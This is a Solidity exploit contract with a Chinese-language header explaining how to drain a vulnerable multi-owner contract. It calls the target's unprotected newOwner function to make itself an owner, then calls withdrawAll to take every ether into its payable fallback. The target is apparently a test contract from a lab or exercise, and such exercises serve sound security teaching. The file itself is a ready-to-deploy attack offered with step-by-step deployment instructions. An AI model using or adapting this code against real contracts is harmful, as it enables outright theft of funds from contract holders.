/*
攻擊碼說明：
本合約利用原始漏洞，直接呼叫 vulnerable 合約的 newOwner 函式，因為該函式沒有 onlyOwner 限制，攻擊者可將自己加入 owners，進而呼叫 withdrawAll 提領合約全部余额。
部署流程：
1. 部署原始漏洞合約 TestContract（包含 MultiOwnable）。
2. 部署 Attack 合約並傳入漏洞合約的地址
3. 呼叫 Attack 合約的 attack() 函式，即可將攻擊者加入 owners，並提領所有 ether。
*/

contract Attack {
    VulnerableTestContract public vulnerableContract;

    // 在部署 Attack 合約時，傳入漏洞合約的位址
    constructor(VulnerableTestContract _vulnerableContract) public {
        vulnerableContract = _vulnerableContract;
    }

    // 攻擊流程：先利用 newOwner 新增自己為 owner，然後呼叫 withdrawAll 提領所有資金
    function attack() public {
        // 利用漏洞，直接新增 Attack 合約地址成為 owner
        vulnerableContract.newOwner(address(this));
        // 提領合約所有 ether
        vulnerableContract.withdrawAll();
    }

    // 接受 ether 的 fallback 函式
    function() external payable {}
}

// 漏洞合約介面定義，方便 Attack 合約呼叫
interface VulnerableTestContract {
    function newOwner(address _owner) external returns (bool);
    function withdrawAll() external;
}